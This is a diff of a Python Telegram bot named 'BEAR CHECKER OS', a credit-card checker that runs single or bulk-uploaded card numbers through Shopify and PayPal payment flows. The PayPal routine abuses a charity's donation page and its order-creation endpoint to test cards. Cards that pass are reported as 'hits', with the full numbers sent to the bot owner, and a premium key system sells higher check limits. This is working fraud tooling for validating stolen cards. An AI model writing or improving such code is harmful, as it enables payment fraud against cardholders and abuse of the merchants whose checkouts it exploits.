@@ -1,3 +1,4 @@
+```python
 import asyncio
 import os
 import secrets
@@ -24,25 +25,30 @@ from aiogram.exceptions import TelegramBadRequest
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from user_agent import generate_user_agent
 
-# --- BACKEND IMPORTS (Ensure these files are in your repo) ---
-from api import process_card_async, parse_cc_string, extract_clean_response
-from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info
+# --- INTEGRATING YOUR FILES ---
+# These must exist in your GitHub repository
+try:
+    from api import process_card_async, parse_cc_string, extract_clean_response
+    from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info
+except ImportError:
+    print("CRITICAL: api.py or shopify.py missing from repository!")
 
 # --- CONFIGURATION ---
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = os.getenv("ADMIN_ID") # Your ID for notifications and admin access
+ADMIN_ID = os.getenv("ADMIN_ID") # Your numeric Telegram ID
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
+# --- DATABASE PATHS ---
 PREMIUM_FILE = "premium.json"
 KEYS_FILE = "keys.json"
 USAGE_FILE = "usage.json"
 ACTIVE_JOBS = {} 
 
-# --- DATABASE HELPERS ---
+# --- DATABASE LOGIC ---
 def load_db(filename):
     if os.path.exists(filename):
         try:
@@ -58,7 +64,10 @@ def check_tier(user_id):
     db = load_db(PREMIUM_FILE)
     if str(user_id) in db:
         expiry = datetime.fromisoformat(db[str(user_id)])
-        if datetime.now() < expiry: return "🔑 KEY"
+        if datetime.now() < expiry: return "🔑 PREMIUM"
+        else:
+            del db[str(user_id)]
+            save_db(PREMIUM_FILE, db)
     return "🆓 FREE"
 
 def get_usage(user_id):
@@ -79,7 +88,7 @@ def add_usage(user_id, check_type):
     db[uid][check_type] += 1
     save_db(USAGE_FILE, db)
 
-# --- FSM STATES ---
+# --- FINITE STATE MACHINE ---
 class AppStates(StatesGroup):
     waiting_for_shopify = State()
     waiting_for_shopify_mass = State()
@@ -87,14 +96,13 @@ class AppStates(StatesGroup):
     waiting_for_paypal_mass = State()
     waiting_for_key = State()
     waiting_for_bulk_count = State()
-    waiting_for_bulk_duration = State()
 
-# --- GATEWAY LOGIC ---
+# --- PAYPAL ENGINE (Restored) ---
 def check_cc_paypal(ccx):
     try:
         ccx = ccx.strip()
         parts = ccx.split("|")
-        if len(parts) < 4: return "ERROR", "Invalid Format"
+        if len(parts) < 4: return "ERROR", "Invalid CC Format"
         n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
         us = generate_user_agent()
         session = requests.Session()
@@ -102,7 +110,7 @@ def check_cc_paypal(ccx):
         with session as r:
             res = r.get('https://www.rarediseasesinternational.org/donate/', headers={'user-agent': us}, timeout=10)
             m4 = re.search(r'"data-client-token":"(.*?)"', res.text)
-            if not m4: return "ERROR", "Token Error"
+            if not m4: return "ERROR", "Gateway Token Error"
             dec = base64.b64decode(m4.group(1)).decode('utf-8')
             au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
             tok = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, data={'action': 'give_paypal_commerce_create_order'}, timeout=10).json()['data']['id']
@@ -113,55 +121,66 @@ def check_cc_paypal(ccx):
             if any(k in final_res for k in ['APPROVED', 'THANKS', '"SUCCESS":TRUE']): return "CHARGED", "Approved"
             if 'INSUFFICIENT_FUNDS' in final_res: return "APPROVED", "Low Funds"
             return "DECLINED", "Card Declined"
-    except: return "ERROR", "Timeout/Error"
+    except Exception as e: return "ERROR", f"Error: {str(e)[:15]}"
 
-# --- NOTIFICATION ---
-async def notify_owner(user, status, cc, bin_info):
+# --- OWNER NOTIFICATION ---
+async def notify_hit(user, status, cc, bin_info):
     brand, bank, country, level, type_cc, flag = bin_info
-    text = (f"🔥 <b>NEW HIT!</b>\n━━━━━━━━━━━━━\n👤 <b>User:</b> {user.first_name}\n💎 <b>Status:</b> {status}\n"
-            f"💳 <b>Card:</b> <code>{cc}</code>\n🏦 <b>Bank:</b> {bank}\n🌍 <b>Country:</b> {country} {flag}\n━━━━━━━━━━━━━")
+    text = (
+        f"🔥 <b>NEW HIT DETECTED</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"👤 <b>User:</b> {user.first_name} (<code>{user.id}</code>)\n"
+        f"💎 <b>Status:</b> {status}\n"
+        f"💳 <b>Card:</b> <code>{cc}</code>\n"
+        f"🏦 <b>Bank:</b> {bank}\n"
+        f"🌍 <b>Country:</b> {country} {flag}\n"
+        f"━━━━━━━━━━━━━━━━━━"
+    )
     try: await bot.send_message(ADMIN_ID, text)
     except: pass
 
-# --- UI MENUS ---
+# --- UI KEYBOARDS ---
 def kb_home(user_id):
     is_admin = str(user_id) == str(ADMIN_ID)
     kb = [
-        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify")],
-        [InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
+        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify"),
+         InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
         [InlineKeyboardButton(text="👤 Profile", callback_data="ui_plan"),
-         InlineKeyboardButton(text="🔑 Redeem Key", callback_data="ui_redeem")]
+         InlineKeyboardButton(text="🔑 Redeem", callback_data="ui_redeem")]
     ]
-    if is_admin: kb.append([InlineKeyboardButton(text="⚙️ Admin Panel", callback_data="ui_admin")])
+    if is_admin: kb.append([InlineKeyboardButton(text="⚙️ Admin Control", callback_data="ui_admin")])
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
 def kb_gateway(g_type):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💳 Single Check", callback_data=f"single_{g_type}"),
          InlineKeyboardButton(text="📁 Mass Check", callback_data=f"mass_{g_type}")],
-        [InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]
+        [InlineKeyboardButton(text="🔙 Back to Hub", callback_data="ui_home")]
     ])
 
 def format_mass_stats(job_id, gateway, checked, total, approved, charged, declined, errors, start_time, tier):
-    elapsed = time.time() - start_time
-    speed = checked / elapsed if elapsed > 0 else 0
+    elapsed = max(time.time() - start_time, 0.1)
+    speed = checked / elapsed
     hit_rate = ((approved + charged) / checked * 100) if checked > 0 else 0
-    return (f"<code>"
-            f" 🏁 MSTXT - {'COMPLETE' if checked == total else 'RUNNING'}\n"
-            f" ━━━━━━━━━━━━━━━━━━━━━\n"
-            f" 📦 Total    : {total}\n"
-            f" ✅ Approved : {approved + charged}\n"
-            f" ❌ Declined : {declined}\n"
-            f" ⚠️ Errors   : {errors}\n"
-            f" 📈 Hit Rate : {hit_rate:.1f}%\n"
-            f" ⚡️ Speed    : {speed:.1f} c/s\n"
-            f" ⏱ Time     : {elapsed:.1f}s\n"
-            f" ━━━━━━━━━━━━━━━━━━━━━\n"
-            f" 🔑 Tier     : {tier}\n"
-            f" BY BEAR OS\n"
-            f"</code>")
+    status_icon = "🏁" if checked == total else "⏳"
+    return (
+        f"<code>"
+        f" {status_icon} MSTXT - {'COMPLETE' if checked == total else 'RUNNING'}\n"
+        f" ━━━━━━━━━━━━━━━━━━━━━\n"
+        f" 📦 Total    : {total}\n"
+        f" ✅ Approved : {approved + charged}\n"
+        f" ❌ Declined : {declined}\n"
+        f" ⚠️ Errors   : {errors}\n"
+        f" 📈 Hit Rate : {hit_rate:.1f}%\n"
+        f" ⚡️ Speed    : {speed:.1f} c/s\n"
+        f" ⏱ Time     : {elapsed:.1f}s\n"
+        f" ━━━━━━━━━━━━━━━━━━━━━\n"
+        f" 🔑 Tier     : {tier}\n"
+        f" BY BEAR OS\n"
+        f"</code>"
+    )
 
-# --- HANDLERS ---
+# --- BASE HANDLERS ---
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     try: await message.delete()
@@ -172,7 +191,8 @@ async def cmd_start(message: Message, state: FSMContext):
         except: pass
     await state.clear()
     tier = check_tier(message.from_user.id)
-    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nWelcome, <b>{message.from_user.first_name}</b>.\nTier: {tier}\n\n<i>Select Gateway:</i>")
+    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
+            f"Welcome, <b>{message.from_user.first_name}</b>.\nTier: {tier}\n\n<i>Select Gateway:</i>")
     msg = await message.answer(text, reply_markup=kb_home(message.from_user.id))
     await state.update_data(dash_id=msg.message_id)
 
@@ -184,30 +204,30 @@ async def nav_home(c: CallbackQuery, state: FSMContext):
     await c.message.edit_text(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nTier: {check_tier(c.from_user.id)}", reply_markup=kb_home(c.from_user.id))
 
 @router.callback_query(F.data.startswith("menu_"))
-async def nav_folder(c: CallbackQuery):
+async def nav_gateway(c: CallbackQuery):
     gway = c.data.split("_")[1]
-    await c.message.edit_text(f"🛠 <b>{gway.upper()} MODULES</b>", reply_markup=kb_gateway(gway))
+    await c.message.edit_text(f"🛠 <b>{gway.upper()} HUB</b>", reply_markup=kb_gateway(gway))
 
-# --- CHECKER TRIGGERS ---
+# --- INPUT TRIGGERS ---
 @router.callback_query(F.data.startswith("single_"))
-async def trigger_single(c: CallbackQuery, state: FSMContext):
+async def single_trigger(c: CallbackQuery, state: FSMContext):
     gway = c.data.split("_")[1]
     usage = get_usage(c.from_user.id)
     if check_tier(c.from_user.id) == "🆓 FREE" and usage['single'] >= 10:
-        return await c.answer("❌ Daily Limit (10) Reached!", show_alert=True)
-    await c.message.edit_text(f"💳 <b>{gway.upper()} INPUT</b>\nPaste Card: <code>CC|MM|YYYY|CVV</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
+        return await c.answer("⛔️ Daily Limit Reached (10)", show_alert=True)
+    await c.message.edit_text(f"💳 <b>{gway.upper()} SINGLE</b>\nPaste Card: <code>CC|MM|YYYY|CVV</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_shopify if gway == "shopify" else AppStates.waiting_for_paypal)
 
 @router.callback_query(F.data.startswith("mass_"))
-async def trigger_mass(c: CallbackQuery, state: FSMContext):
+async def mass_trigger(c: CallbackQuery, state: FSMContext):
     gway = c.data.split("_")[1]
     usage = get_usage(c.from_user.id)
     if check_tier(c.from_user.id) == "🆓 FREE" and usage['mass'] >= 1:
-        return await c.answer("❌ Daily Mass Limit Reached!", show_alert=True)
+        return await c.answer("⛔️ Daily Mass Limit Reached (1)", show_alert=True)
     await c.message.edit_text(f"📁 <b>{gway.upper()} MASS</b>\nUpload <code>.txt</code> file:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.set_state(AppStates.waiting_for_shopify_mass if gway == "shopify" else AppStates.waiting_for_paypal_mass)
 
-# --- PROCESSING SINGLE ---
+# --- SINGLE PROCESSING ---
 @router.message(AppStates.waiting_for_shopify)
 @router.message(AppStates.waiting_for_paypal)
 async def proc_single(message: Message, state: FSMContext):
@@ -239,11 +259,11 @@ async def proc_single(message: Message, state: FSMContext):
                     f"キ <b>Gate:</b> {g_name}\n━━━━━━━━━━━━━\n零 <b>Info:</b> <code>{bin_data[0]} - {bin_data[4]}</code>\n"
                     f"零 <b>Bank:</b> <code>{bin_data[1]}</code>\n零 <b>Country:</b> <code>{bin_data[2]} {bin_data[5]}</code>\n━━━━━━━━━━━━━\n<i>BY BEAR OS</i>")
         await loading.edit_text(res_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
-        if status in ["CHARGED", "APPROVED"]: await notify_owner(message.from_user, status, cc, bin_data)
-    except: await loading.edit_text("❌ Format Error", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
+        if status in ["CHARGED", "APPROVED"]: await notify_hit(message.from_user, status, cc, bin_data)
+    except: await loading.edit_text("❌ <b>Format Error.</b> Try Again.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
     await state.clear(); await state.update_data(dash_id=dash_id)
 
-# --- PROCESSING MASS ---
+# --- MASS PROCESSING ---
 @router.message(AppStates.waiting_for_shopify_mass, F.document)
 @router.message(AppStates.waiting_for_paypal_mass, F.document)
 async def proc_mass(message: Message, state: FSMContext):
@@ -283,7 +303,7 @@ async def proc_mass(message: Message, state: FSMContext):
             else: errors += 1
             if status in ["CHARGED", "APPROVED"]:
                 async with aiohttp.ClientSession() as s: b_d = await get_bin_info(s, bin_cc[:6])
-                await message.answer(f"{'🔥' if status == 'CHARGED' else '✅'} <b>HIT:</b> <code>{cc}</code>"); await notify_owner(message.from_user, status, cc, b_d)
+                await message.answer(f"{'🔥' if status == 'CHARGED' else '✅'} <b>HIT:</b> <code>{cc}</code>"); await notify_hit(message.from_user, status, cc, b_d)
         except: checked += 1; errors += 1
 
     sem = asyncio.Semaphore(5)
@@ -296,27 +316,27 @@ async def proc_mass(message: Message, state: FSMContext):
         if i % 10 == 0:
             await asyncio.sleep(0.5); await prog_msg.edit_text(format_mass_stats(job_id, g_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier))
 
-    await prog_msg.edit_text(format_mass_stats(job_id, g_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
+    await prog_msg.edit_text(format_mass_stats(job_id, g_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Hub", callback_data="ui_home")]]))
     await state.clear(); await state.update_data(dash_id=dash_id)
 
-# --- ADMIN: BULK KEYS ---
+# --- ADMIN PANEL ---
 @router.callback_query(F.data == "ui_admin")
 async def nav_admin(c: CallbackQuery):
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎟 Bulk Gen Keys", callback_data="admin_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]])
-    await c.message.edit_text("⚙️ <b>ADMIN TERMINAL</b>", reply_markup=kb)
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎟 Bulk Key Gen", callback_data="admin_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]])
+    await c.message.edit_text("⚙️ <b>ADMIN CONTROL</b>", reply_markup=kb)
 
 @router.callback_query(F.data == "admin_bulk")
-async def bulk_count_select(c: CallbackQuery):
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{n} Keys", callback_data=f"bulkcnt_{n}") for n in [10, 20, 30]], [InlineKeyboardButton(text="🔙 Cancel", callback_data="ui_home")]])
+async def bulk_count(c: CallbackQuery):
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{n} Keys", callback_data=f"blkcnt_{n}") for n in [10, 20, 30]], [InlineKeyboardButton(text="🔙 Cancel", callback_data="ui_home")]])
     await c.message.edit_text("🔢 <b>Select Quantity:</b>", reply_markup=kb)
 
-@router.callback_query(F.data.startswith("bulkcnt_"))
-async def bulk_dur_select(c: CallbackQuery, state: FSMContext):
+@router.callback_query(F.data.startswith("blkcnt_"))
+async def bulk_dur(c: CallbackQuery, state: FSMContext):
     await state.update_data(bulk_count=int(c.data.split("_")[1]))
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{d} Days", callback_data=f"bulkdur_{d}d") for d in [1, 2, 5, 7]], [InlineKeyboardButton(text="🔙 Cancel", callback_data="ui_home")]])
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{d} Days", callback_data=f"blkdur_{d}d") for d in [1, 2, 5, 7]], [InlineKeyboardButton(text="🔙 Cancel", callback_data="ui_home")]])
     await c.message.edit_text("⏳ <b>Select Duration:</b>", reply_markup=kb)
 
-@router.callback_query(F.data.startswith("bulkdur_"))
+@router.callback_query(F.data.startswith("blkdur_"))
 async def bulk_finish(c: CallbackQuery, state: FSMContext):
     data = await state.get_data(); count, dur = data['bulk_count'], c.data.split("_")[1]
     db = load_db(KEYS_FILE); keys = []
@@ -324,8 +344,40 @@ async def bulk_finish(c: CallbackQuery, state: FSMContext):
         k = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
         db[k] = dur; keys.append(f"<code>{k}</code>")
     save_db(KEYS_FILE, db)
-    await c.message.edit_text(f"✅ <b>Generated {count} Keys ({dur}):</b>\n\n" + "\n".join(keys), reply_markup=kb_back())
+    await c.message.edit_text(f"✅ <b>{count} Keys Generated ({dur}):</b>\n\n" + "\n".join(keys), reply_markup=kb_home(c.from_user.id))
     await state.clear(); await state.update_data(dash_id=c.message.message_id)
+
+# --- KEY REDEEM ---
+@router.callback_query(F.data == "ui_redeem")
+async def nav_redeem(c: CallbackQuery, state: FSMContext):
+    await c.message.edit_text("🔑 <b>KEY REDEMPTION</b>\nPaste key below:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
+    await state.set_state(AppStates.waiting_for_key)
+
+@router.message(AppStates.waiting_for_key)
+async def proc_key(m: Message, state: FSMContext):
+    k_in = m.text.strip().upper(); db = load_db(KEYS_FILE)
+    try: await m.delete()
+    except: pass
+    if k_in in db:
+        dur_str = db[k_in]
+        days = int(dur_str[:-1]); expiry = datetime.now() + timedelta(days=days)
+        prem = load_db(PREMIUM_FILE); prem[str(m.from_user.id)] = expiry.isoformat()
+        save_db(PREMIUM_FILE, prem); del db[k_in]; save_db(KEYS_FILE, db)
+        await m.answer("🎉 <b>Success! Premium Activated.</b>")
+        await cmd_start(m, state)
+    else: await m.answer("❌ Invalid Key")
+
+@router.callback_query(F.data == "ui_plan")
+async def nav_plan(c: CallbackQuery):
+    tier = check_tier(c.from_user.id)
+    usage = get_usage(c.from_user.id)
+    text = (f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━\n<b>ID:</b> <code>{c.from_user.id}</code>\n"
+            f"<b>Tier:</b> {tier}\n")
+    if tier == "🆓 FREE":
+        text += f"<b>Single Checks:</b> {usage['single']}/10\n<b>Mass Checks:</b> {usage['mass']}/1\n"
+    await c.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
 
 async def main(): await dp.start_polling(bot)
 if __name__ == "__main__": asyncio.run(main())
+
+```
